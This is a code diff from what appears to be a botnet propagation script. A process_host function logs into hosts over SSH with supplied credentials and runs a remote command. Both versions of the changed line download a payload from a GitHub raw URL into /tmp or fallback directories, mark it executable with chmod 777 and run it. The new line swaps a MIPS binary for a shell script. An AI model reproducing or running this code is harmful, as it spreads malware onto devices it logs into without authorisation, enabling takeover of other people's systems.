@@ -11,7 +11,7 @@ def process_host(credentials):
         ssh.connect(hostname=host, username=username, password=password)
         print(f"Connected to --> {host}")
 
-        stdin, stdout, stderr = ssh.exec_command('cd /tmp; wget https://raw.githubusercontent.com/20Matrix77/jdifjshfirej/refs/heads/main/mips; chmod 777 mips; ./mips')
+        stdin, stdout, stderr = ssh.exec_command('cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/20Matrix77/DHJIF/refs/heads/main/skfnw.sh; chmod 777 *; sh skfnw.sh')
 
         time.sleep(10)
 
